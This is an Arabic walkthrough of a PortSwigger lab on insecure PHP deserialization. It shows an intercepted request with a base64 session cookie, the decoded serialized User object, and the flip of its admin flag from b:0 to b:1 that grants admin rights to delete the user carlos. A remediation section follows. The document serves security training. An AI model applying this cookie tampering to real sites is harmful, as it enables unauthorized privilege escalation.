# [Modifying serialized objects](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects)

## **`الهدف`**
قم بتعديل الكائن المسلسل في `session cookie` للحصول على صلاحيات إدارية ثم قم بحذف حساب `carlos`.
## **`خطوات الحل`**
نقوم بالدخول إلى حساب `wiener:peter` ونقوم بتحويل أى طلب يحتوى على الـ `Cookie` مثل طلب `/my-account` إلى `Repeater`
```http
GET /my-account?id=wiener HTTP/2
Host: 0ad8004504af143f85e25dce00650026.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d
```
وعند تظليل الـ `Cookie` وفحصها داخل `Inspector` بعد فك ترميز `URL` ثم ترميز `Base64` عنها سنجد أنها كالتالي:
```PHP
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```
لذلك سنقوم بتعديل قيمة `b:0` إلى `b:1` من داخل `Inspector` ثم سنقوم بنسخ الـ `Cookie` الجديد ونتوجه إلى المتصفح ونضغط `F12` ثم  `Application` ونضعه في خانة الـ `Session` داخل الـ `Cookies` ثم نضغط `Enter` لنجد أنه أصبح لدينا صلاحيات إدارية 

وبعد ذلك نتوجه إلى `Admin panel` ثم نقوم بحذف حساب `carlos` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
يجب أن يكون الـ `Cookie` المُرسل للمستخدم مجرد `Session ID` عشوائي `Cryptographically Secure Session ID`، يتم توليده باستخدام دالة عشوائية آمنة تشفيرياً لمنع أى عمليات توقع أو تخمين من المهاجم، ويتم ربط المستخدم بالـ `Session ID` بشكل صارم في الواجهة الخلفية `back-end` ليستطيع السيرفر معرفة الـ `Role` الحقيقي للمستخدم، وإذا لم يكن الـ `Role` الخاص بالمستخدم يخوله للدخول إلى مسار `/admin`، فيتم رفض الـ `request` فورًا بـ `403 Forbidden` إذا كان مسجل دخول بالفعل ولكنه مستخدم عادي، أو `401 Unauthorized` إذا لم يمكن مسجل دخول من الأساس، وليس مجرد عمل إعادة توجيه.

وإذا كانت معمارية التطبيق تتطلب تخزين حالة الجلسة عند العميل `Stateless Applications` لتقليل الحمل على السيرفر، فيجب حماية هذه البيانات من التلاعب باستخدام التوقيع الرقمي مثل آلية عمل `JWT`.

ويجب التوقف عن استخدام `unserialize()` الأصلية في `PHP` لأنها دالة خطيرة جدًا إذا تم تمرير بيانات يتحكم فيها المستخدم إليها، وبدلًا من ذلك يتم استخدام صيغ بيانات أمنة مثل `JSON` عن طريق `json_decode()`.

وإذا كان هناك نظام قديم `Legacy System` لا يمكن فيه الاستغناء عن دالة `unserialize()`، فيمكن ترقيع الثغرة جزئياً في إصدارات `PHP 7.0` وما فوق عن طريق تمرير مصفوفة `allowed_classes` كمعامل ثانٍ للدالة لمنع إنشاء أي كائنات غير مصرح بها، ولكن هذا لن يمنع ثغرات تعديل الصلاحيات ولكنه سيمنع ثغرات الـ `RCE`.
